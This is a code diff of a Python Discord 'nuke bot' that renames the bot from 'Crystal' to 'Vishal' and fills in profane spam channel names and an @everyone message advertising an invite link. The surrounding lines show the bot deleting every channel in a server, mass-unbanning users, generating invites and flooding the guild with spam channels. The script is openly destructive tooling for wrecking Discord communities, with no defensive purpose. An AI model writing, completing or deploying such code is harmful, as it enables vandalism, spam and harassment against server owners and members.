@@ -5,14 +5,14 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-SPAM_CHANNEL = ["SPAM CHANNEL HERE”]
-SPAM_MESSAGE = ["SPAM MESSAGE HERE"]
+SPAM_CHANNEL = ["FUCKED BY VISHALL XD”]
+SPAM_MESSAGE = ["@everyone FUCKING JOIN THIS SERVER FOR RECOVERY https://discord.gg/UFvjK5Uy5e"]
 
-client = commands.Bot(command_prefix="PREFIX HERE")
+client = commands.Bot(command_prefix=",")
 
 @client.event
 async def on_ready():
-      print(Fore.MAGENTA + 'Crystals Nuke Bot is on!! Do (Prefix) to 
+      print(Fore.MAGENTA + 'VISHALS Nuke Bot is on!! Do (Prefix) to 
 nuke discord servers!!' + Fore.RESET)
       await 
 client.change_presence(activity=discord.Game(name="BIO 
@@ -31,7 +31,7 @@ Fore.RESET)
 
 
         except:
-            print(Fore.CYAN + "Crystal Runs You" + Fore.RESET)
+            print(Fore.CYAN + "Vishal Runs You" + Fore.RESET)
         for channel in guild.channels:
             try:
                 await channel.delete()
@@ -80,7 +80,7 @@ Was Unbanned." + Fore.RESET)
                 print(Fore.BLUE + f" [+] 
 {user.name}#{user.discriminator} Was Not Unbanned." + 
 Fore.RESET)
-        await guild.create_text_channel("crystals nukebot")
+        await guild.create_text_channel("vishals nukebot")
         for channel in guild.text_channels:
                 link = await channel.create_invite(max_age = 0, 
 max_uses = 0)
@@ -89,7 +89,7 @@ max_uses = 0)
         for i in range(amount):
               await 
 guild.create_text_channel(random.choice(SPAM_CHANNEL))
-        print(f"Nuked {guild.name} Crystal Nuker Runs You")
+        print(f"Nuked {guild.name} vishal Nuker Runs You")
         return
 
 @client.event
